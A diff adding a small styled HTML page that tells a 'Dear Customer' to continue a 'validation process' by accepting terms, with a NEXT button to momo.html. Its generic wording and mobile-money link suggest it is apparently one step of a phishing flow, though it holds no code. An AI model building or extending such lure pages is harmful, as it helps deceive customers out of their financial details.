@@ -1,1 +1,83 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Next Step</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background: linear-gradient(to bottom, #08143a, #0b1d4d);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      color: #fff;
+      min-height: 100vh;
+      padding: 0 10px;
+    }
 
+    .container {
+      background: linear-gradient(145deg, rgba(10,25,70,0.95), rgba(15,35,90,0.95));
+      width: 90%;
+      max-width: 400px;
+      margin-top: 80px;
+      padding: 40px 25px;
+      border-radius: 12px;
+      box-shadow: 0 6px 16px rgba(0,0,0,0.4);
+      backdrop-filter: blur(4px);
+      text-align: center;
+    }
+
+    .container h2 {
+      margin-bottom: 15px;
+      color: #1e90ff;
+    }
+
+    .container p {
+      margin-bottom: 25px;
+      font-size: 15px;
+      line-height: 1.4;
+    }
+
+    .btn {
+      background: linear-gradient(135deg, #1e90ff, #187bcd);
+      color: #fff;
+      border: none;
+      padding: 14px 30px;
+      border-radius: 6px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      text-decoration: none;
+      display: inline-block;
+      transition: all 0.3s ease;
+    }
+
+    .btn:hover {
+      background: linear-gradient(135deg, #187bcd, #1560a3);
+      transform: scale(1.05);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+    }
+
+    @media (max-width: 500px) {
+      .container {
+        padding: 30px 20px;
+      }
+      .btn {
+        font-size: 16px;
+        padding: 12px 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h2>Dear Customer!</h2>
+    <p>Please continue to proceed with your validation process by accepting the T&C's applied.</p>
+    <a href="momo.html" class="btn">NEXT</a>
+  </div>
+
+</body>
+</html>
